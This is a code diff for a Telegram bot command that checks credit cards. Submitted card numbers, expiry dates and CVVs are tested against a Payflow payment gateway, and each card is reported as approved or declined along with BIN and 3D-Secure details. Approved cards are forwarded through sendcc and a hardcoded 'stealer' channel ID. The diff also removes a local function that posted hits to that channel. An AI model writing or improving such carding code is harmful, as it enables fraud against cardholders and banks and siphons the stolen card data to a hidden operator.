@@ -1,50 +1,45 @@
-import httpx
 import time
 import asyncio
+import json
 from pyrogram import Client, filters
 from FUNC.usersdb_func import *
 from FUNC.defs import *
 from TOOLS.check_all_func import *
 from TOOLS.getbin import *
-from .response import *
+from .response import get_charge_resp
 from .gate import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
 # Replace with your actual channel ID
 STEALER_CHANNEL_ID = -1002549777556
 
-async def send_hit_if_approved(client: Client, text: str):
-    try:
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
-    except Exception as e:
-        print(f"[Stealer Error] Failed to forward: {e}")
-
-@Client.on_message(filters.command("b5", [".", "/"]))
-async def stripe_auth_cmd(Client, message):
+@Client.on_message(filters.command("pf", [".", "/"]))
+async def payflow_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
 
-        gateway = "Braintree Auth 5"
+        gateway = "Payflow Gateway"
 
-        if checkall[0] == False:
+        if not checkall[0]:
             return
 
         role = checkall[1]
         getcc = await getmessage(message)
-        if getcc == False:
+        if not getcc:
             resp = f"""<b>
 Gate Name: {gateway} ♻️
-CMD: /b5
+CMD: /pf
 
 Message: No CC Found in your input ❌
 
-Usage: /b5 cc|mes|ano|cvv</b>"""
+Usage: /pf cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
+        bin6 = cc[:6]  # BIN for easy reference
 
         firstresp = f"""
 ↯ Checking.
@@ -68,14 +63,21 @@ Usage: /b5 cc|mes|ano|cvv</b>"""
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
 
         start = time.perf_counter()
-        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
-        sks = await getallsk()
-        result = await create_cvv_charge(fullcc, session)
+        payflow = PayflowAuth()
+        raw_result, elapsed = payflow.main(fullcc)  # synchronous call
+
+        # Fix: do NOT parse JSON response here since Payflow is URL-encoded string key=value pairs
+        # Just extract raw string response from raw_result list
+        if isinstance(raw_result, list) and len(raw_result) > 0:
+            raw_resp_str = raw_result[0]
+        else:
+            raw_resp_str = raw_result if isinstance(raw_result, str) else str(raw_result)
+
         getbin = await get_bin_details(cc)
-        getresp = await get_charge_resp(result, user_id, fullcc)
-        
-        # Use the response directly from get_charge_resp
-        status = getresp["status"]  # This will be "Approved" or "Declined"
+        # Pass raw Payflow response string directly to response parser
+        getresp = await get_charge_resp(raw_resp_str, user_id, fullcc)
+
+        status = getresp["status"]
         response = getresp["response"]
 
         thirdresp = f"""
@@ -88,39 +90,35 @@ Usage: /b5 cc|mes|ano|cvv</b>"""
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        brand = getbin[0]
-        type = getbin[1]
-        level = getbin[2]
-        bank = getbin[3]
-        country = getbin[4]
-        flag = getbin[5]
-        currency = getbin[6]
+        brand = getbin[0] if len(getbin) > 0 else "Unknown"
+        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
+        level = getbin[2] if len(getbin) > 2 else "Unknown"
+        bank = getbin[3] if len(getbin) > 3 else "Unknown"
+        country = getbin[4] if len(getbin) > 4 else "Unknown"
+        flag = getbin[5] if len(getbin) > 5 else ""
+        currency = getbin[6] if len(getbin) > 6 else "Unknown"
 
-        # Check vbvbin.txt file for VBV status
-        vbv_status = "Not Found"  # Default value if not found
-        with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
-            vbv_data = file.readlines()
+        vbv_status = "Not Found"
+        try:
+            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
+                vbv_data = file.readlines()
+            bin_found = False
+            for line in vbv_data:
+                line = line.strip()
+                if not line:
+                    continue
+                parts = line.split('|')
+                if parts[0] == bin6:
+                    bin_found = True
+                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
+                    break
+            if not bin_found:
+                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
+        except FileNotFoundError:
+            vbv_status = "VBV BIN file missing"
 
-        bin_found = False
-        for line in vbv_data:
-            if line.startswith(cc[:6]):
-                bin_found = True
-                vbv_response = line.strip().split('|')[1]
-                if "3D TRUE ❌" in vbv_response:
-                    vbv_status = "3D TRUE ❌"
-                elif "3D PASSED ✅" in vbv_response:
-                    vbv_status = "3D PASSED ✅"
-                break
-
-        if not bin_found:
-            vbv_response= "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
-            vbvv_status= "Lookup Card Error"
-
-        # Always indicate proxy is live
-        # Always indicate proxy is live
         proxy_status = "Live ✨"
-        bin_code = cc[:6]  # Define bin_code
- 
+
         finalresp = f"""
 {status}
 ━━━━━━━━━━━━━━━
@@ -142,12 +140,13 @@ Usage: /b5 cc|mes|ano|cvv</b>"""
 """
         await asyncio.sleep(0.5)
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
+
         await setantispamtime(user_id)
         await deductcredit(user_id)
         if status == "Approved ✅":
-            await sendcc(finalresp, session)
-        await session.aclose()
+            await sendcc(finalresp, payflow.session)
+        payflow.session.close()
 
-    except Exception as e:
+    except Exception:
         import traceback
         await error_log(traceback.format_exc())
